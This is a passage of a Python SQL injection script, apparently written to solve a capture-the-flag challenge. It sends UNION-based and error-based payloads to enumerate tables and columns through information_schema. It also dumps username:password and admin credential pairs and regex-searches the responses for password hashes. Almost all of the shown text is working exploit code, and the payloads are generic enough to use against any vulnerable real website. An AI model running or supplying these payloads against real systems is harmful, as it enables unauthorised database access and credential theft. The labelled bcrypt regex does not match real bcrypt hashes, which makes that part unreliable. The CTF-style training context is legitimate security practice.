common_tables = ['users', 'admin', 'flag', 'posts', 'categories']

for table in common_tables[:3]:  # Test first 3
    print(f"\n[+] Attempting to extract data from '{table}' table")
    
    # Try to get column count first
    col_count_payload = f"' UNION SELECT COUNT(*),{','.join(['NULL'] * (column_count-1))} FROM {table}-- "
    result = send_payload(col_count_payload, f"Count rows in {table}", extract_data=True)
    
    # Try to extract first row concatenated
    extract_payload = f"' UNION SELECT GROUP_CONCAT(*),{','.join(['NULL'] * (column_count-1))} FROM {table} LIMIT 1-- "
    result = send_payload(extract_payload, f"Extract all data from {table}", extract_data=True)
    
    if 'flag' in result:
        print(f"[!!!] FLAG FOUND: {result['flag']}")
        exit()

# Step 5: Target admin or flag-specific extraction
print("\n" + "=" * 80)
print("STEP 5: Targeting admin/login credentials")
print("=" * 80)

admin_payloads = [
    {
        'payload': f"' UNION SELECT CONCAT(username,':',password),{','.join(['NULL'] * (column_count-1))} FROM users LIMIT 1-- ",
        'description': "Extract username:password from users table"
    },
    {
        'payload': f"' UNION SELECT CONCAT(admin_user,':',admin_pass),{','.join(['NULL'] * (column_count-1))} FROM admin LIMIT 1-- ",
        'description': "Extract admin credentials"
    },
    {
        'payload': f"' UNION SELECT flag,{','.join(['NULL'] * (column_count-1))} FROM flag LIMIT 1-- ",
        'description': "Extract flag from flag table"
    },
    {
        'payload': f"' UNION SELECT CONCAT(table_name,':',column_name),{','.join(['NULL'] * (column_count-1))} FROM information_schema.columns WHERE table_schema=database() LIMIT 5-- ",
        'description': "Extract table:column pairs"
    }
]

for test in admin_payloads:
    result = send_payload(test['payload'], test['description'], extract_data=True)
    
    # Look for credentials in response
    text = result.get('text', '')
    credentials = re.findall(r'(\w+):(\$\$[a-f0-9]+\$\$[a-zA-Z0-9./]+)', text)  # bcrypt format
    if credentials:
        print(f"[!!!] CREDENTIALS FOUND: {credentials}")
    
    # Look for plain text credentials
    plain_creds = re.findall(r'(\w+):([a-f0-9]{32,40})', text)  # hash formats
    if plain_creds:
        print(f"[!!!] HASHED CREDENTIALS: {plain_creds}")
    
    if 'flag' in result:
        print(f"[!!!] FLAG FOUND: {result['flag']}")

# Step 6: Error-based data extraction
print("\n" + "=" * 80)
print("STEP 6: Error-based data extraction")
print("=" * 80)

error_payloads = [
    {
        'payload': f"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT CONCAT(table_name,0x3a,column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
        'description': "Error-based column extraction"
    },
    {
        'payload': f"' OR (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT flag FROM flag LIMIT 1),0x3a,FLOOR(RAND(0)*2))x FROM users GROUP BY x)a)-- ",
        'description': "Error-based flag extraction"
    }
]

for test in error_payloads:
    result = send_payload(test['payload'], test['description'], extract_data=True)
    
    # Error-based often shows data in error messages
    if result.get('size', 0) > 1500:  # Larger response might contain errors with data
        print(f"[!] Large response received, checking for embedded data...")

